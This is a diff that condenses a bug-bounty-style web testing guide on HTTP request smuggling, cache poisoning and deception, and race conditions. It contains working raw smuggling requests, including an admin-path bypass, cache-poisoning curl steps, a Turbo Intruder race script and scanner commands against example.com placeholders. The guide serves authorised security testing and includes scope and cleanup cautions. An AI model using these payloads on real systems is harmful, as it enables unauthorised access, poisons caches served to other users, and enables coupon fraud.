@@ -22,9 +22,7 @@
 
 ### Step 1: Time-Based Detection (Safe)
 
-Send a request where CL says the body is short, but TE chunked body includes a trailing partial request. If the back-end uses TE, it processes the chunked body and the trailing bytes poison the next request — causing a timeout.
-
-**Request (send via raw socket or Burp Repeater with "Update Content-Length" OFF):**
+Send a request where CL says the body is short, but TE chunked body includes trailing bytes. Use raw socket or Burp Repeater with "Update Content-Length" OFF:
 
 ```http
 POST / HTTP/1.1
@@ -38,25 +36,14 @@ Transfer-Encoding: chunked
 X
 ```
 
-**Explanation:**
-- `Content-Length: 6` tells the front-end (nginx) the body is `0\r\n\r\nX` (6 bytes)
-- Front-end forwards the full 6 bytes to the back-end
-- Back-end uses Transfer-Encoding: chunked, reads `0\r\n\r\n` as end of chunked body
-- The trailing `X` is left in the connection buffer as the start of the NEXT request
-- When the next real request arrives, the back-end tries to parse `XGET / HTTP/1.1...` — fails or times out
+**How it works:** `CL: 6` tells the front-end (nginx) the body is `0\r\n\r\nX`. Front-end forwards all 6 bytes. Back-end uses TE chunked, reads `0\r\n\r\n` as end of body. The trailing `X` stays in the buffer as the start of the NEXT request — back-end tries to parse `XGET / HTTP/1.1...` and fails.
 
-**Expected response if vulnerable:**
-- First request: `200 OK` (processed normally by front-end)
-- Second request (any normal follow-up on same connection): **timeout** or `400 Bad Request`
-
-**Expected response if NOT vulnerable:**
-- Both requests: `200 OK` (no desync — both sides agree on body boundary)
-
-**Conclusion:** If the follow-up request times out or returns 400, you have a CL.TE desync. The front-end and back-end disagree on where the body ends.
+**Vulnerable:** First request `200 OK`, follow-up on same connection **times out** or `400 Bad Request`.
+**Not vulnerable:** Both requests `200 OK` (no desync).
 
 ### Step 2: Differential Confirmation
 
-Confirm it's CL.TE and not something else. Send the inverse (TE.CL test) — this should NOT cause desync on a CL.TE target:
+Send the inverse (TE.CL test) — should NOT desync on a CL.TE target:
 
 ```http
 POST / HTTP/1.1
@@ -71,11 +58,7 @@ POST /404check HTTP/1.1
 X: x
 ```
 
-If this request works normally (no desync), you've confirmed CL.TE: the front-end uses CL (and ignores TE), while the back-end uses TE (and ignores CL).
-
-### Step 3: Prove Impact (Controlled)
-
-**Do not proceed to exploitation on production without confirming program scope allows infrastructure-level testing.**
+Normal response = confirmed CL.TE: front-end uses CL, back-end uses TE. **Do not proceed to exploitation without confirming program scope allows infrastructure-level testing.**
 
 ---
 
@@ -100,32 +83,11 @@ X: x
 
 ```
 
-**What happens:**
-1. Front-end sees `POST /` (allowed) with CL: 60
-2. Front-end forwards all 60 bytes to back-end
-3. Back-end uses TE chunked — reads `0\r\n\r\n` as end of first request, responds `200 OK`
-4. Remaining bytes `GET /admin HTTP/1.1\r\nHost: target.example.com\r\nX: x\r\n\r\n` sit in the connection buffer
-5. Next request on this connection gets PREPENDED with the smuggled `GET /admin` bytes
-6. Back-end processes `GET /admin` directly — bypassing the front-end's path restriction
+**What happens:** Front-end sees `POST /` (allowed) with CL: 60, forwards all bytes. Back-end uses TE chunked — reads `0\r\n\r\n` as end of first request. Remaining bytes (`GET /admin...`) sit in the buffer and prepend the next request on the connection. Back-end processes `GET /admin` directly — bypassing front-end path restriction.
 
-**Response to capture:**
+**Evidence for report:** Screenshot of admin panel HTML from smuggled request + proof that direct `GET /admin` returns `403 Forbidden` + timestamp correlation.
 
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-...
-
-<html><title>Admin Panel</title>
-<h1>User Management</h1>
-...
-```
-
-**Evidence for report:**
-- Screenshot of admin panel HTML returned via smuggled request
-- Timestamp correlation: your request vs the admin panel response
-- Proof that direct `GET /admin` returns `403 Forbidden` from the front-end
-
-**Severity:** Critical — full front-end access control bypass. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (9.3+)
+**Severity:** Critical — full front-end access control bypass. CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (10.0)
 
 ---
 
@@ -153,45 +115,23 @@ content-type: text/html
 <link rel="canonical" href="https://canary123.example.com/login">
 ```
 
-**Key observation:** `canary123.example.com` is reflected in the `<script src>` attribute. The `cf-cache-status: MISS` means this wasn't served from cache — the origin processed it.
+**Key observation:** `canary123.example.com` reflected in `<script src>`. `cf-cache-status: MISS` means the origin processed it.
 
 ### Step 2: Confirm Cache Stores the Poisoned Response
 
-```
-curl -s "https://target.example.com/login?cachebuster=abc123" -D -
-```
+Re-request **without** X-Forwarded-Host: `curl -s "https://target.example.com/login?cachebuster=abc123" -D -`
 
-**Response (no X-Forwarded-Host this time):**
-
-```http
-HTTP/2 200
-cf-cache-status: HIT
-age: 3
-
-<html>
-<script src="https://canary123.example.com/static/app.js"></script>
-```
-
-**Conclusion:** The poisoned response is now cached for this cache key. Any user requesting the same cache key (`/login?cachebuster=abc123`) gets a page loading JavaScript from `canary123.example.com`. To confirm production impact, repeat without the cachebuster and check if the query string is part of the cache key. If the attacker hosts malicious JS there, this is **stored XSS via cache poisoning**.
+If response shows `cf-cache-status: HIT` with `canary123.example.com` still in the HTML — the poisoned response is cached. Any user requesting this cache key gets attacker-controlled JavaScript. Repeat without cachebuster to check production impact.
 
 ### Step 3: Clean Up
 
-Remove the cachebuster and check if the production cache is affected:
+`curl -s "https://target.example.com/login" -D - | grep "canary123"` — if results, production cache is poisoned. Report immediately and request cache purge.
 
-```
-curl -s "https://target.example.com/login" -D - | grep "canary123"
-```
-
-If this returns results, the production cache is poisoned — report immediately and request the cache be purged.
-
-**Evidence for report:**
-1. Curl showing reflection of X-Forwarded-Host in response (MISS)
-2. Curl showing cached response serves the poisoned content (HIT)
-3. Curl from different IP/browser showing same poisoned response
+**Evidence:** (1) Reflection on MISS, (2) Poisoned content on HIT, (3) Same result from different IP/browser.
 
 **Severity:** Critical — stored XSS affecting all visitors. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
 
-**Common false positive:** If `cf-cache-status: DYNAMIC` or `Cache-Control: no-store` / `private`, the response isn't stored in shared caches — no cache poisoning impact. Note: `no-cache` still allows storage but requires revalidation; only `no-store` prevents caching entirely.
+**FP check:** `cf-cache-status: DYNAMIC` or `Cache-Control: no-store`/`private` = no shared caching = no cache poisoning. Note: `no-cache` still allows storage (revalidation only); only `no-store` prevents caching.
 
 ---
 
@@ -252,18 +192,9 @@ age: 45
 3. Second request without auth returns same private data
 4. Use TWO different sessions/IPs to prove cross-user access
 
-**Severity:** High (requires victim to click attacker-crafted link). CVSS: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
+**Severity:** Medium — CVSS v3.1 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N); programs often rate higher when cached PII is exposed cross-user
 
-**Variants to test:**
-
-| Suffix | Why it might work |
-|--------|------------------|
-| `/x.css` | CDN caches CSS by default |
-| `/x.js` | CDN caches JavaScript |
-| `/x.png` | Image extension |
-| `%2Fx.css` | Encoded slash — CDN decodes, origin doesn't |
-| `;x.css` | Path parameter — CDN sees extension, origin ignores |
-| `/x.avif` | Newer format, CDN may cache aggressively |
+**Variants to test:** `/x.css`, `/x.js`, `/x.png` (standard cached extensions); `%2Fx.css` (encoded slash — CDN decodes, origin doesn't); `;x.css` (path parameter — CDN sees extension, origin ignores); `/x.avif` (newer format, aggressive caching).
 
 ---
 
@@ -273,49 +204,23 @@ age: 45
 
 ### Step 1: Prepare the Race
 
-Using Turbo Intruder (Burp extension) or a custom script. The key is the **single-packet attack** for HTTP/2 or **last-byte sync** for HTTP/1.1.
-
-**HTTP/2 single-packet attack concept:**
+Use **single-packet attack** (HTTP/2) or **last-byte sync** (HTTP/1.1). Turbo Intruder is the standard tool:
 
 ```python
-# Pseudocode — send 10 identical requests in one TCP packet
-import h2.connection
+# Turbo Intruder — single-packet attack (all requests in one TCP packet)
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=1,
+                          engine=Engine.BURP2)
+    for i in range(20):
+        engine.queue(target.req, gate='race1')
+    engine.openGate('race1')  # Release all at once
 
-conn = h2.connection.H2Connection()
-# ... establish connection ...
-
-# Send 10 streams with all headers
-for i in range(10):
-    stream_id = conn.get_next_available_stream_id()
-    conn.send_headers(stream_id, headers=[
-        (':method', 'POST'),
-        (':path', '/api/cart/apply-coupon'),
-        (':authority', 'target.example.com'),
-        ('content-type', 'application/json'),
-        ('cookie', 'session=YOUR_SESSION'),
-    ])
-    # Send body for each stream BUT hold back END_STREAM flag
-    conn.send_data(stream_id, b'{"coupon":"SAVE50"}')
-
-# Now send all END_STREAM flags at once — server processes all simultaneously
-for stream_id in stream_ids:
-    conn.send_data(stream_id, b'', end_stream=True)
+def handleResponse(req, interesting):
+    table.add(req)
 ```
 
-**HTTP/1.1 low-fidelity parallel test with curl (simpler but has network jitter):**
-
-```bash
-# Send 10 concurrent requests (not true last-byte sync — use Turbo Intruder for precision)
-for i in $(seq 1 10); do
-  curl -s -X POST "https://target.example.com/api/cart/apply-coupon" \
-    -H "Content-Type: application/json" \
-    -H "Cookie: session=YOUR_SESSION" \
-    -d '{"coupon":"SAVE50"}' &
-done
-wait
-```
-
-**Note:** The bash approach has network jitter. For precise timing, use Turbo Intruder's single-packet attack or a custom HTTP/2 script.
+Set the base request to `POST /api/cart/apply-coupon` with `{"coupon":"SAVE50"}`. For quick CLI testing (lower precision): `seq 1 20 | xargs -P 20 -I {} curl -s -X POST ... -d '{"coupon":"SAVE50"}' &`
 
 ### Step 2: Analyze Responses
 
@@ -332,29 +237,14 @@ wait
 {"status": "error", "message": "Coupon already used"}
 ```
 
-**Evidence:** Two `200 OK` with `"success"` out of 10 attempts = race condition confirmed. The server checked coupon validity before marking it used, and two requests passed the check simultaneously.
-
-**Not vulnerable:**
-
-```json
-// Response 1: {"status": "success", "discount": "$50.00"}
-// Responses 2-10: {"status": "error", "message": "Coupon already used"}
-```
-
-Only one success = proper serialization (database lock or atomic operation).
+**Vulnerable:** Two+ `"success"` out of 20 attempts = race confirmed. Server checked validity before marking used; concurrent requests passed the check.
+**Not vulnerable:** Only one `"success"`, rest get `"Coupon already used"` = proper serialization.
 
 ### Step 3: Prove Business Impact
 
-- Check the cart: is the coupon applied twice ($100 discount instead of $50)?
-- Check order history: can you complete checkout with the double discount?
-- Screenshot the cart showing the inflated discount
+**Evidence:** (1) Two concurrent successful coupon applications (timestamps), (2) Cart showing double discount ($100 instead of $50), (3) Sequential attempt only allows single application.
 
-**Evidence for report:**
-1. Response timestamps showing two concurrent successful coupon applications
-2. Cart state showing double discount applied
-3. Proof that a normal sequential attempt only allows one application
-
-**Severity:** High — financial impact (doubled discounts). Medium if the discount is trivial.
+**Severity:** High — financial impact (doubled discounts). Medium if discount is trivial.
 
 ---
 
@@ -401,11 +291,7 @@ Host: target.example.com
 
 **Key insight:** HTTP/2 doesn't use Content-Length for framing (DATA frames are self-delimiting). But when the CDN converts to HTTP/1.1, the CL header becomes meaningful and creates a desync.
 
-### Detection Signal
-
-Detection is indirect — you won't see two HTTP/1.1 responses on a single H2 stream. Instead:
-- **Timeout on follow-up:** Send a normal request on the same H2 connection after the smuggling attempt. If the follow-up times out or returns an unexpected response (e.g., admin panel HTML instead of normal page), the smuggled request was processed.
-- **Response queue poisoning:** The smuggled request's response may be served to the NEXT user's request on the shared back-end connection — check for response content that doesn't match what you requested.
+**Detection:** Send a normal follow-up request on the same H2 connection. If it times out or returns unexpected content (admin panel HTML), the smuggled request was processed. The smuggled response may also be served to other users' requests on the shared back-end connection.
 
 ---
 
@@ -422,18 +308,9 @@ curl -s -X POST "https://target.example.com/health" \
   -D -
 ```
 
-(Note: curl overrides Content-Length with the actual body size when using `-d`. For precise CL control, use raw sockets, netcat, or Burp Repeater with "Update Content-Length" disabled.)
+**Note:** curl overrides CL with actual body size — use raw sockets or Burp Repeater with "Update Content-Length" disabled for precise CL control.
 
-**Response:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: application/json
-
-{"status": "healthy"}
-```
-
-The server responded 200 and ignored the body. On a keep-alive connection, those bytes are now sitting in the buffer.
+Server responds `200 OK` `{"status": "healthy"}` and ignores the body. On a keep-alive connection, those bytes sit in the buffer.
 
 ### Step 2: Exploit via Connection Reuse
 
@@ -473,24 +350,12 @@ Before testing, identify the proxy stack. Each component introduces specific des
 ### Quick Fingerprinting Commands
 
 ```bash
-# Identify CDN/proxy via response headers
-curl -s -D - "https://target.example.com/" | grep -iE \
-  "server:|via:|x-cache|cf-|x-amz|x-varnish|x-fastly|x-served|x-proxy"
-
-# Check HTTP/2 support (ALPN negotiation)
+# CDN/proxy headers + HTTP/2 check
+curl -s -D - "https://target.example.com/" | grep -iE "server:|via:|x-cache|cf-|x-amz|x-varnish|x-fastly"
 curl -v --http2 "https://target.example.com/" 2>&1 | grep ALPN
-
-# Detect proxy by error page styling
-curl -s "https://target.example.com/nonexistent-path-12345" | head -20
-
-# Check Transfer-Encoding handling
-curl -s -H "Transfer-Encoding: chunked" \
-  -H "Transfer-Encoding: x" \
-  "https://target.example.com/" -D -
-
-# Test for proxy-specific headers
-curl -s -H "X-Forwarded-Host: canary.test" \
-  "https://target.example.com/" | grep "canary"
+# TE handling + unkeyed header reflection
+curl -s -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: x" "https://target.example.com/" -D -
+curl -s -H "X-Forwarded-Host: canary.test" "https://target.example.com/" | grep "canary"
 ```
 
 ### Fingerprint-to-Attack Matrix
@@ -511,57 +376,15 @@ curl -s -H "X-Forwarded-Host: canary.test" \
 
 ## Tool Commands Reference
 
-### Burp Suite
-
-| Task | Where |
-|------|-------|
-| Raw smuggling | Repeater → uncheck "Update Content-Length" → send raw bytes |
-| TE obfuscation | Repeater → manually edit Transfer-Encoding variations |
-| HTTP/2 testing | Repeater → toggle HTTP/2 mode → inject pseudo-headers |
-| Turbo Intruder (races) | Extensions → Turbo Intruder → `race-single-packet-attack.py` |
-| Param Miner (cache) | Extensions → Param Miner → right-click → "Guess headers" |
-| HTTP Request Smuggler | Extensions → HTTP Request Smuggler → "Launch smuggle probe" |
-
-### CLI Tools
-
-```bash
-# smuggler — automated smuggling detection
-python3 smuggler.py -u https://target.example.com/
-
-# h2csmuggler — HTTP/2 cleartext (h2c) upgrade smuggling
-# Note: only for h2c upgrade attacks, NOT for HTTPS H2→H1 downgrade testing
-python3 h2csmuggler.py -x https://target.example.com/ \
-  --test
-
-# Web Cache Vulnerability Scanner (WCVS)
-# Use -sh for single header test, -hw for header wordlist file
-wcvs -u https://target.example.com/ -sh "X-Forwarded-Host: canary.test"
-
-# Race condition via curl (basic)
-seq 1 20 | xargs -P 20 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
-  -X POST "https://target.example.com/api/redeem" \
-  -H "Cookie: session=TOKEN" \
-  -d '{"code":"PROMO"}'
-```
-
-### Turbo Intruder Single-Packet Script
-
-```python
-# For Burp Turbo Intruder — single-packet attack (all requests in one TCP packet)
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                          concurrentConnections=1,
-                          engine=Engine.BURP2)
-    # Queue 20 identical requests, all gated
-    for i in range(20):
-        engine.queue(target.req, gate='race1')
-
-    # Release all at once — single TCP packet
-    engine.openGate('race1')
-
-def handleResponse(req, interesting):
-    table.add(req)
-```
+| Tool | Command / Location |
+|------|--------------------|
+| **Burp Repeater** (smuggling) | Uncheck "Update Content-Length" → send raw bytes; toggle HTTP/2 mode for H2 testing |
+| **Turbo Intruder** (races) | `race-single-packet-attack.py` — see Example 5 for script |
+| **Param Miner** (cache keys) | Right-click → "Guess headers" |
+| **HTTP Request Smuggler** | "Launch smuggle probe" |
+| **smuggler** (CLI) | `python3 smuggler.py -u https://target.example.com/` |
+| **h2csmuggler** (h2c upgrade only) | `python3 h2csmuggler.py -x https://target.example.com/ --test` |
+| **WCVS** (cache vuln scanner) | `wcvs -u https://target.example.com/ -sh "X-Forwarded-Host: canary.test"` |
 
 ---
 
